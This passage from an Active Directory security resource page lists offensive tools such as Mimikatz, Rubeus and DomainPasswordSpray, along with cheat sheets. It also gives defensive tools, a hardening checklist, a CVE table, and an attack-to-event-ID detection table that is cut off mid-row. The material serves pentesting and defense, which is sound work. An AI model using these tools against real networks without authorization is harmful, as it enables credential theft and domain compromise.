data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2J5dDNibDMzZDNyL0NyYWNrTWFwRXhlYw==\">CrackMapExec</span> - A swiss army knife for pentesting networks</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Nhbml4MS9BREFDTFNjYW5uZXI=\">ADACLScanner</span> - A tool with GUI or command linte used to create reports of access control lists (DACLs) and system access control lists (SACLs) in Active Directory</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N5YmVyYXJrL3pCYW5n\">zBang</span> - zBang is a risk assessment tool that detects potential privileged account threats</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dob3N0UGFjay9TYWZldHlLYXR6\">SafetyKatz</span> - SafetyKatz is a combination of slightly modified version of @gentilkiwi's Mimikatz project and @subTee's .NET PE Loader.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dob3N0UGFjay9TaGFycER1bXA=\">SharpDump</span> - SharpDump is a C# port of PowerSploit's Out-Minidump.ps1 functionality.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05ldFNQSS9Qb3dlclVwU1FM\">PowerUpSQL</span> - A PowerShell Toolkit for Attacking SQL Server</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dob3N0UGFjay9SdWJldXM=\">Rubeus</span> -  Rubeus is a C# toolset for raw Kerberos interaction and abuses</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlLW9mLXNlY3VyaXR5L0FEUmVjb24=\">ADRecon</span> - A tool which gathers information about the Active Directory and generates a report which can provide a holistic picture of the current state of the target AD environment</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kvbWltaWthdHo=\">Mimikatz</span> - Utility to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory but also perform pass-the-hash, pass-the-ticket or build Golden tickets</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2wwc3MvR3JvdXBlcg==\">Grouper</span> - A PowerShell script for helping to find vulnerable settings in AD Group Policy.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0tldmluLVJvYmVydHNvbi9Qb3dlcm1hZA==\">Powermad</span> - PowerShell MachineAccountQuota and DNS exploit tools</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL1JBQ0U=\">RACE</span> - RACE is a PowerShell module for executing ACL attacks against Windows targets.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21kYXZpczMzMi9Eb21haW5QYXNzd29yZFNwcmF5\">DomainPasswordSpray</span> - DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RhZnRoYWNrL01haWxTbmlwZXI=\">MailSniper</span> - MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.)</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xlb2xvb2JlZWsvTEFQU1Rvb2xraXQ=\">LAPSToolkit</span> - Tool to audit and attack LAPS environments.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NyZWREZWZlbnNlL0NyZWREZWZlbnNl\">CredDefense</span> - Credential and Red Teaming Defense for Windows Environments</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL2xkYXBkb21haW5kdW1w\">ldapdomaindump</span> - Active Directory information dumper via LDAP</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xlZWNocmlzdGVuc2VuL1Nwb29sU2FtcGxlLw==\">SpoolSample</span> - PoC tool to coerce Windows hosts authenticate to other machines via the MS-RPRN RPC interface</li>\n</ul>\n<h2 id=\"ebooks\"><a class=\"anchor\" href=\"#ebooks\">#</a> Ebooks</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXJudy5kZS9kb3dubG9hZC9CbG9vZEhvdW5kV29ya3Nob3AvRVJOV19Eb2dXaGlzcGVyZXJIYW5kYm9vay5wZGY=\">The Dog Whisperer’s Handbook – A Hacker’s Guide to the BloodHound Galaxy</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmFyb25pcy5jb20vYmxvZy92YXJvbmlzLWVib29rLXBlbi10ZXN0aW5nLWFjdGl2ZS1kaXJlY3RvcnktZW52aXJvbm1lbnRzLw==\">Varonis eBook: Pen Testing Active Directory Environments</span></li>\n</ul>\n<h2 id=\"cheat-sheets\"><a class=\"anchor\" href=\"#cheat-sheets\">#</a> Cheat Sheets</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hhcm1KMHkvQ2hlYXRTaGVldHM=\">Tools Cheat Sheets</span> - Tools (PowerView, PowerUp, Empire, and PowerSploit)</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NhZFByb2Nlc3Nvci9DaGVhdHMvYmxvYi9tYXN0ZXIvRG9nV2hpc3BlcmVyVjIubWQ=\">DogWhisperer - BloodHound Cypher Cheat Sheet (v2)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vSGFybUoweS8xODRmOTgyMmIxOTVjNTJkZDUwYzM3OWVkMzExNzk5Mw==\">PowerView-3.0 tips and tricks</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vSGFybUoweS8zMzI4ZDk1NDYwN2Q3MTM2MmUzYw==\">PowerView-2.0 tips and tricks</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Njb3ViaS9CbG9vZGhvdW5kQUQtUXVlcmllcw==\">BloodhoundAD-Queries</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vVGFybG9naWNTZWN1cml0eS8yZjIyMTkyNGZlZjhjMTRhMWQ4ZTI5ZjNjYjVjNWM0YQ==\">Kerberos Attacks Cheat Sheet</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYXVzZWMuY29tLzIwMTkvMDkvMDkvYmxvb2Rob3VuZC1jeXBoZXItY2hlYXRzaGVldC8=\">Bloodhound Cypher Cheatsheet</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20va25ldGh0ZW8vMmZjOGFmNmVhMjgxOTlmZDYzYTUyOWE3M2E0MTc2Yzc=\">Kerberos cheatsheet</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0ludGVncmF0aW9uLUlUL0FjdGl2ZS1EaXJlY3RvcnktRXhwbG9pdGF0aW9uLUNoZWF0LVNoZWV0\">Active Directory Exploitation Cheat Sheet</span></li>\n</ul>\n<h2 id=\"other-resources\"><a class=\"anchor\" href=\"#other-resources\">#</a> Other Resources</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMWoyblcwNUgtaVJ6Ny1GVlRSaC1MQlhRbTZNNllJQlFOV2E0Vjd0cDk5WVEv\">Tactics, Techniques and Procedures for Attacking Active Directory BlackHat Asia 2019</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGVudGVzdHBhcnRuZXJzLmNvbS9zZWN1cml0eS1ibG9nL2Jsb29kaG91bmQtd2Fsa3Rocm91Z2gtYS10b29sLWZvci1tYW55LXRyYWRlY3JhZnRzLw==\">Bloodhound walkthrough. A Tool for Many Tradecrafts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yMzYy\">Attack Methods for Gaining Domain Admin Rights in Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvbmV0dGl0dWRlX2xhYnMvcG93ZXJzaGVsbGlzZGVhZGVwaWNsZWFybmluZ3Nsb25kb24=\">PowerShell Is Dead Epic Learnings</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMWxRSFRxWFpJRHh3YUlVblhkTy1FZHZHcDc5UnpIMXJiTTR6RTQ1S2tpMkkvZWRpdCNzbGlkZT1pZC5nMzVmMzkxMTkyXzAw\">Finding Our Path: How We’re Trying to Improve Active Directory Security</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1KY0ZkTkFsZUlrNCZhbXA7ZmVhdHVyZT15b3V0dS5iZQ==\">SteelCon 2019: Getting Splunky With Kerberos - Ross Bingham and Tom MacDonald</span></li>\n</ul>\n<hr />\n<h2 id=\"defense-detection\"><a class=\"anchor\" href=\"#defense-detection\">#</a> Defense &amp; Detection</h2>\n<h3 id=\"tools-scripts-2\"><a class=\"anchor\" href=\"#tools-scripts-2\">#</a> Tools &amp; Scripts</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nb2ZpbGUuaW8vZC9JQUtETG4=\">Invoke-TrimarcADChecks</span> - The Invoke-TrimarcADChecks.ps1 PowerShell script is designed to gather data from a single domain AD forest to performed Active Directory Security Assessment (ADSA).</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RhdmlkcHJvd2UvQURfU2VjX1Rvb2xz\">Create-Tiers in AD</span> - Project Title Active Directory Auto Deployment of Tiers in any environment</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nYWxsZXJ5LnRlY2huZXQubWljcm9zb2Z0LmNvbS9TQU1SaTEwLUhhcmRlbmluZy1SZW1vdGUtNDhkOTRiNWI=\">SAMRi10</span>  - Hardening SAM Remote Access in Windows 10/Server 2016</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nYWxsZXJ5LnRlY2huZXQubWljcm9zb2Z0LmNvbS9OZXQtQ2Vhc2UtQmxvY2tpbmctTmV0LTFlOGRjYjVi\">Net Cease</span>  - Hardening Net Session Enumeration</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGluZ2Nhc3RsZS5jb20v\">PingCastle</span> - A tool designed to assess quickly the Active Directory security level with a methodology based on risk assessment and a maturity framework</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nYWxsZXJ5LnRlY2huZXQubWljcm9zb2Z0LmNvbS9Bb3JhdG8tU2tlbGV0b24tS2V5LTI0ZTQ2Yjcz\">Aorato Skeleton Key Malware Remote DC Scanner</span> - Remotely scans for the existence of the Skeleton Key Malware</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nYWxsZXJ5LnRlY2huZXQubWljcm9zb2Z0LmNvbS9SZXNldC10aGUta3JidGd0LWFjY291bnQtNTgxYTllNTE=\">Reset the krbtgt account password/keys</span> - This script will enable you to reset the krbtgt account password and related keys while minimizing the likelihood of Kerberos authentication issues being caused by the operation</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nYWxsZXJ5LnRlY2huZXQubWljcm9zb2Z0LmNvbS9SZXNldC1UaGUtS3JiVGd0LUFjY291bnQtNWY0NWE0MTQ=\">Reset The KrbTgt Account Password/Keys For RWDCs/RODCs</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N5YmVyYXJrL1Jpc2t5U1BO\">RiskySPN</span> - RiskySPNs is a collection of PowerShell scripts focused on detecting and abusing accounts associated with SPNs (Service Principal Name).</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL0RlcGxveS1EZWNlcHRpb24=\">Deploy-Deception</span> -  A PowerShell module to deploy active directory decoy objects</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ZsZXRvdXgvU3Bvb2xlclNjYW5uZXI=\">SpoolerScanner</span> - Check if MS-RPRN is remotely available with powershell/c#</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NlY3VyZXdvcmtzL2RjZXB0\">dcept</span> - A tool for deploying and detecting use of Active Directory honeytokens</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pQQ0VSVENDL0xvZ29uVHJhY2Vy\">LogonTracer</span> - Investigate malicious Windows logon by visualizing and analyzing Windows event log</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NoZWxsc3Rlci9EQ1NZTkNNb25pdG9y\">DCSYNCMonitor</span> - Monitors for DCSYNC and DCSHADOW attacks and create custom Windows Events for these events</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05lbzIzeDAvc2lnbWEv\">Sigma</span> - Generic Signature Format for SIEM Systems</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9zeXNtb24=\">Sysmon</span> - System Monitor (Sysmon) is a Windows system service and device driver that, once installed on a system, remains resident across system reboots to monitor and log system activity to the Windows event log.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pQQ0VSVENDL1N5c21vblNlYXJjaA==\">SysmonSearch</span> - Investigate suspicious activity by visualizing Sysmon's event log</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VuZGdhbWVpbmMvQ2xyR3VhcmQ=\">ClrGuard</span> - ClrGuard is a proof of concept project to explore instrumenting the Common Language Runtime (CLR) for security purposes.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vZGV6aHViLzI4NzVmYTZkYzc4MDgzY2VkZWFiMTBhYmM1NTFjYjU4\">Get-ClrReflection</span> - Detects memory-only CLR (.NET) modules.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vamFyZWRjYXRraW5zb24vMjM5MDVkMzQ1MzdjZTRiNWIxODE4YzNlNjQwNWMxZDI=\">Get-InjectedThread</span> - Get-InjectedThread looks at each running thread to determine if it is the result of memory injection.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZpcmVleWUvU2lsa0VUVw==\">SilkETW</span> - SilkETW &amp; SilkService are flexible C# wrappers for ETW, they are meant to abstract away the complexities of ETW and give people a simple interface to perform research and introspection.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzBLZWUtVGVhbS9XYXRjaEFE\">WatchAD</span> - AD Security Intrusion Detection System</li>\n</ul>\n<h3 id=\"sysmon-configuration\"><a class=\"anchor\" href=\"#sysmon-configuration\">#</a> Sysmon Configuration</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29sYWZoYXJ0b25nL3N5c21vbi1tb2R1bGFy\">sysmon-modular</span> - A Sysmon configuration repository for everybody to customise</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01IYWdnaXMvc3lzbW9uLWRmaXI=\">sysmon-dfir</span> - Sources, configuration and how to detect evil things utilizing Microsoft Sysmon.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1N3aWZ0T25TZWN1cml0eS9zeXNtb24tY29uZmln\">sysmon-config</span> - Sysmon configuration file template with default high-quality event tracing</li>\n</ul>\n<h3 id=\"active-directory-security-checks-by-sean-metcalf-pyrotek3\"><a class=\"anchor\" href=\"#active-directory-security-checks-by-sean-metcalf-pyrotek3\">#</a> Active Directory Security Checks (by Sean Metcalf - @Pyrotek3)</h3>\n<h4 id=\"general-recommendations\"><a class=\"anchor\" href=\"#general-recommendations\">#</a> General Recommendations</h4>\n<ul>\n<li>Manage local Administrator passwords (LAPS).</li>\n<li>Implement RDP Restricted Admin mode (as needed).</li>\n<li>Remove unsupported OSs from the network.</li>\n<li>Monitor scheduled tasks on sensitive systems (DCs, etc.).</li>\n<li>Ensure that OOB management passwords (DSRM) are changed regularly &amp; securely stored.</li>\n<li>Use SMB v2/v3+</li>\n<li>Default domain Administrator &amp; KRBTGT password should be changed every year &amp; when an AD admin leaves.</li>\n<li>Remove trusts that are no longer necessary &amp; enable SID filtering as appropriate.</li>\n<li>All domain authentications should be set (when possible) to: &quot;Send NTLMv2 response onlyrefuse LM &amp; NTLM.&quot;</li>\n<li>Block internet access for DCs, servers, &amp; all administration systems.</li>\n</ul>\n<h4 id=\"protect-admin-credentials\"><a class=\"anchor\" href=\"#protect-admin-credentials\">#</a> Protect Admin Credentials</h4>\n<ul>\n<li>No &quot;user&quot; or computer accounts in admin groups.</li>\n<li>Ensure all admin accounts are &quot;sensitive &amp; cannot be delegated&quot;.</li>\n<li>Add admin accounts to &quot;Protected Users&quot; group (requires Windows Server 2012 R2 Domain Controllers, 2012R2 DFL for domain protection).</li>\n<li>Disable all inactive admin accounts and remove from privileged groups.</li>\n</ul>\n<h4 id=\"protect-ad-admin-credentials\"><a class=\"anchor\" href=\"#protect-ad-admin-credentials\">#</a> Protect AD Admin Credentials</h4>\n<ul>\n<li>Limit AD admin membership (DA, EA, Schema Admins, etc.) &amp; only use custom delegation groups.</li>\n<li>‘Tiered’ Administration mitigating credential theft impact.</li>\n<li>Ensure admins only logon to approved admin workstations &amp; servers.</li>\n<li>Leverage time-based, temporary group membership for all admin accounts</li>\n</ul>\n<h4 id=\"protect-service-account-credentials\"><a class=\"anchor\" href=\"#protect-service-account-credentials\">#</a> Protect Service Account Credentials</h4>\n<ul>\n<li>Limit to systems of the same security level.</li>\n<li>Leverage “(Group) Managed Service Accounts” (or PW &gt;20 characters) to mitigate credential theft (kerberoast).</li>\n<li>Implement FGPP (DFL =&gt;2008) to increase PW requirements for SAs and administrators.</li>\n<li>Logon restrictions – prevent interactive logon &amp; limit logon capability to specific computers.</li>\n<li>Disable inactive SAs &amp; remove from privileged groups.</li>\n</ul>\n<h4 id=\"protect-resources\"><a class=\"anchor\" href=\"#protect-resources\">#</a> Protect Resources</h4>\n<ul>\n<li>Segment network to protect admin &amp; critical systems.</li>\n<li>Deploy IDS to monitor the internal corporate network.</li>\n<li>Network device &amp; OOB management on separate network.</li>\n</ul>\n<h4 id=\"protect-domain-controllers\"><a class=\"anchor\" href=\"#protect-domain-controllers\">#</a> Protect Domain Controllers</h4>\n<ul>\n<li>Only run software &amp; services to support AD.</li>\n<li>Minimal groups (&amp; users) with DC admin/logon rights.</li>\n<li>Ensure patches are applied before running DCPromo (especially MS14-068 and other critical patches).</li>\n<li>Validate scheduled tasks &amp; scripts.</li>\n</ul>\n<h4 id=\"protect-workstations-servers\"><a class=\"anchor\" href=\"#protect-workstations-servers\">#</a> Protect Workstations (&amp; Servers)</h4>\n<ul>\n<li>Patch quickly, especially privilege escalation vulnerabilities.</li>\n<li>Deploy security back-port patch (KB2871997).</li>\n<li>Set Wdigest reg key to 0 (KB2871997/Windows 8.1/2012R2+): HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlSecurityProvidersWdigest</li>\n<li>Deploy workstation whitelisting (Microsoft AppLocker) to block code exec in user folders – home dir &amp; profile path.</li>\n<li>Deploy workstation app sandboxing technology (EMET) to mitigate application memory exploits (0-days).</li>\n</ul>\n<h4 id=\"logging\"><a class=\"anchor\" href=\"#logging\">#</a> Logging</h4>\n<ul>\n<li>Enable enhanced auditing</li>\n<li>“Audit: Force audit policy subcategory settings (Windows Vista or later) to override audit policy category settings”</li>\n<li>Enable PowerShell module logging (“*”) &amp; forward logs to central log server (WEF or other method).</li>\n<li>Enable CMD Process logging &amp; enhancement (KB3004375) and forward logs to central log server.</li>\n<li>SIEM or equivalent to centralize as much log data as possible.</li>\n<li>User Behavioural Analysis system for enhanced knowledge of user activity (such as Microsoft ATA).</li>\n</ul>\n<h4 id=\"security-pros-checks\"><a class=\"anchor\" href=\"#security-pros-checks\">#</a> Security Pro’s Checks</h4>\n<ul>\n<li>Identify who has AD admin rights (domain/forest).</li>\n<li>Identify who can logon to Domain Controllers (&amp; admin rights to virtual environment hosting virtual DCs).</li>\n<li>Scan Active Directory Domains, OUs, AdminSDHolder, &amp; GPOs for inappropriate custom permissions.</li>\n<li>Ensure AD admins (aka Domain Admins) protect their credentials by not logging into untrusted systems (workstations).</li>\n<li>Limit service account rights that are currently DA (or equivalent).</li>\n</ul>\n<h3 id=\"important-security-updates\"><a class=\"anchor\" href=\"#important-security-updates\">#</a> Important Security Updates</h3>\n<table>\n<thead>\n<tr>\n<th>CVE</th>\n<th>Title</th>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>CVE-2020-1472</td>\n<td>Netlogon Elevation of Privilege Vulnerability</td>\n<td>An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller, using the Netlogon Remote Protocol (MS-NRPC). An attacker who successfully exploited the vulnerability could run a specially crafted application on a device on the network.</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0NWRS0yMDIwLTE0NzI=\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472</span></td>\n</tr>\n<tr>\n<td>CVE-2019-1040</td>\n<td>Windows NTLM Tampering Vulnerability</td>\n<td>A tampering vulnerability exists in Microsoft Windows when a man-in-the-middle attacker is able to successfully bypass the NTLM MIC (Message Integrity Check) protection, aka 'Windows NTLM Tampering Vulnerability'.</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0NWRS0yMDE5LTEwNDA=\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1040</span></td>\n</tr>\n<tr>\n<td>CVE-2019-0683</td>\n<td>Active Directory Elevation of Privilege Vulnerability</td>\n<td>An elevation of privilege vulnerability exists in Active Directory Forest trusts due to a default setting that lets an attacker in the trusting forest request delegation of a TGT for an identity from the trusted forest, aka 'Active Directory Elevation of Privilege Vulnerability'.</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0NWRS0yMDE5LTA2ODM=\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0683</span></td>\n</tr>\n<tr>\n<td>CVE-2019-0708</td>\n<td>Remote Desktop Services Remote Code Execution Vulnerability</td>\n<td>A remote code execution vulnerability exists in Remote Desktop Services formerly known as Terminal Services when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests, aka 'Remote Desktop Services Remote Code Execution Vulnerability'.</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0NWRS0yMDE5LTA3MDg=\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708</span></td>\n</tr>\n<tr>\n<td>CVE-2018-8581</td>\n<td>Microsoft Exchange Server Elevation of Privilege Vulnerability</td>\n<td>An elevation of privilege vulnerability exists in Microsoft Exchange Server, aka &quot;Microsoft Exchange Server Elevation of Privilege Vulnerability.&quot; This affects Microsoft Exchange Server.</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0NWRS0yMDE4LTg1MTg=\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8518</span></td>\n</tr>\n<tr>\n<td>CVE-2017-0143</td>\n<td>Windows SMB Remote Code Execution Vulnerability</td>\n<td>The SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets, aka &quot;Windows SMB Remote Code Execution Vulnerability.&quot; This vulnerability is different from those described in CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, and CVE-2017-0148.</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0NWRS0yMDE3LTAxNDM=\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0143</span></td>\n</tr>\n<tr>\n<td>CVE-2016-0128</td>\n<td>Windows SAM and LSAD Downgrade Vulnerability</td>\n<td>The SAM and LSAD protocol implementations in Microsoft Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8.1, Windows Server 2012 Gold and R2, Windows RT 8.1, and Windows 10 Gold and 1511 do not properly establish an RPC channel, which allows man-in-the-middle attackers to perform protocol-downgrade attacks and impersonate users by modifying the client-server data stream, aka &quot;Windows SAM and LSAD Downgrade Vulnerability&quot; or &quot;BADLOCK.&quot;</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0NWRS0yMDE2LTAxMjg=\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2016-0128</span></td>\n</tr>\n<tr>\n<td>CVE-2014-6324</td>\n<td>Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780)</td>\n<td>The Kerberos Key Distribution Center (KDC) in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, and Windows Server 2012 Gold and R2 allows remote authenticated domain users to obtain domain administrator privileges via a forged signature in a ticket, as exploited in the wild in November 2014, aka &quot;Kerberos Checksum Vulnerability.&quot;</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc2VjdXJpdHktdXBkYXRlcy9zZWN1cml0eWJ1bGxldGlucy8yMDE0L21zMTQtMDY4\">https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068</span></td>\n</tr>\n<tr>\n<td>CVE-2014-1812</td>\n<td>Vulnerability in Group Policy Preferences could allow elevation of privilege</td>\n<td>The Group Policy implementation in Microsoft Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, and Windows Server 2012 Gold and R2 does not properly handle distribution of passwords, which allows remote authenticated users to obtain sensitive credential information and consequently gain privileges by leveraging access to the SYSVOL share, as exploited in the wild in May 2014, aka &quot;Group Policy Preferences Password Elevation of Privilege Vulnerability.&quot;</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4tdXMvaGVscC8yOTYyNDg2L21zMTQtMDI1LXZ1bG5lcmFiaWxpdHktaW4tZ3JvdXAtcG9saWN5LXByZWZlcmVuY2VzLWNvdWxkLWFsbG93LWVsZXZhdGk=\">https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati</span></td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"detection\"><a class=\"anchor\" href=\"#detection\">#</a> Detection</h3>\n<table>\n<thead>\n<tr>\n<th>Attack</th>\n<th>Event ID</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Account and Group Enumeration</td>\n<td>4798: A user's local group membership was enumerated<br>4799: A security-enabled local group membership was enumerated</td>\n</tr>\n<tr>\n<td>AdminSDHolder</td>\n<td>4780: The ACL was set on accounts which are members of administrators groups</td>\n</tr>\n<tr>\n<td>Kekeo</td>\n<td>4624: Account Logon<br>4672: Admin Logon<br>4768: Kerberos TGS Request</td>\n</tr>\n<tr>\n<td>Silver\tTicket</td>\n<td>4624: Account Logon<br>4634: Account Logoff<br>4672: Admin Logon</td>\n</tr>\n<tr>\n<td>Golden\tTicket</td>\n<td>4624: Account Logon<br>4672: Admin Logon</td>\n</tr>\n<tr>\n<td>PowerShell</td>\n<td>4103: Script Block Logging<br>400: Engine Lifecycle<br>403: Engine Lifecycle<br>4103: Module Logging<br>600: Provider Lifecycle<br></td>\n</tr>\n<tr>\n<td>DCShadow</td>\n<td>4742: A computer account was changed<br>5137: A directory service object was created<br>5141: A directory service object was deleted<br>4929: An Active Directory replica source naming context was 